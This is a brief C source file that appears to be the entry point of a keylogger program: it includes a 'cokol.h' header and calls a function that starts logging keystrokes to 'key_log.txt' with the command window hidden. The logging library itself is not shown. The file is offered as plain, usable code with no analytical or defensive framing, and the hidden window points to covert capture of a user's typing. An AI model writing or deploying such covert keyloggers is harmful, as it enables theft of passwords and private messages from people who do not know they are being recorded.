#include "cokol.h"

#define KEY_LOG_FILE_NAME "key_log.txt"
#define SHOW_CMD_WINDOW 0

int main(void) {
    return cokol_start_key_logging(KEY_LOG_FILE_NAME, SHOW_CMD_WINDOW);
}
